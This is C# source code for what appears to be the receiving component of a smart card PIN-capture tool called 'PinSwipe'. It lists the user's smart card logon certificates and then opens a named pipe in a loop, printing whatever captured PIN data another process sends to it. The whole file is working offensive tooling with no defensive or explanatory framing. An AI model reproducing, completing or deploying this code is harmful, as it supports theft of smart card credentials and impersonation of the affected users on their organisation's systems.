using System;
using System.Data.SqlTypes;
using System.IO.Pipes;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace PinSwipeListener {
    class Program {

        static Oid SmartCardLogonOid = new Oid("1.3.6.1.4.1.311.20.2.2");

        static bool IsSmartCardLogonCert(X509Certificate2 cert) {

            foreach(X509Extension ext in cert.Extensions) {
                if(ext is X509EnhancedKeyUsageExtension eexts) {
                    foreach(Oid oid in eexts.EnhancedKeyUsages) {
                        if (oid.Value.Equals(SmartCardLogonOid.Value))
                            return true;
                    }
                }
            }

            return false;
        }

        static void DumpSmartCardCerts() {

            X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadOnly);

            foreach (X509Certificate2 cert in store.Certificates) {            
                if (IsSmartCardLogonCert(cert)) {
                    Console.WriteLine($"[+] Found smart card logon certificate with thumbprint {cert.Thumbprint} and subject {cert.Subject}");
                }              
            }
        }

        static public void Listen(string PipeName) {
            try {

                Console.WriteLine("[+] Started PinSwipe Listener");

                while (true) {
   
                    NamedPipeServerStream pipeServer = new NamedPipeServerStream(PipeName,PipeDirection.In, 10);
                    
                    pipeServer.WaitForConnection();

                    byte[] buffer = new byte[1024];          
                    int readAmount = pipeServer.Read(buffer, 0, 1024);
                    Console.WriteLine($"[+] PinSwipe: {Encoding.UTF8.GetString(buffer, 0, readAmount)}");

                    pipeServer.Close();
                }
             
            } catch (Exception ex) {
                Console.WriteLine($"[!] Pipe listener failed: {ex.Message}");
            }
        }

        static void  Main(string[] args) {
            DumpSmartCardCerts();
            Listen("PinSwipe");                        
        }
    }
}
